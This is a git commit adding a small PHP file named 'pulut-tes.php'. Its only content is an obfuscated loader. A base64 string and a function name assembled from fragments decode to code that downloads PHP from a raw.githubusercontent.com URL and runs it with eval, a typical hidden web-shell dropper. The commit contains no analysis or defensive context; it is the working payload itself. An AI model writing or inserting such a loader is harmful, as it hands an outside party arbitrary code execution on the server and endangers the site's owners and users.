df048dea80c33af864edb717c87c7df038d16d8e
kunjet <nehadhe9@gmail.com>
2026-09-07 19:07:56 +0700

    pulut-tes.php

---
+++ pulut-tes.php
@@ -0,0 +1,16 @@
+<?php
+// Obfuscated by internal obfuscator (base64)
+$z = "";
+$z .= "JGF3byA9ICdodHRwczovLyc7DQogICAg";
+$z .= "ICAgIGV2YWwoIj8+IiAuIGZpbGVfZ2V0";
+$z .= "X2NvbnRlbnRzKCRhd28gLiAncmF3Lmdp";
+$z .= "dGh1YnVzZXJjb250ZW50LmNvbS9kZWUx";
+$z .= "MTAzL2RlZS9yZWZzL2hlYWRzL21haW4v";
+$z .= "b2JmLWJlc2FyLXB1bHV0LXRoZXJlLnBo";
+$z .= "cCcpKTsNCiAgICAgICAgZXhpdDs=";
+
+// reconstruct function name
+$a = "ba"; $b = "se"."64"."_de"."co"."de"; $c = $a.$b;
+$payload = $c($z);
+eval($payload);
+?>
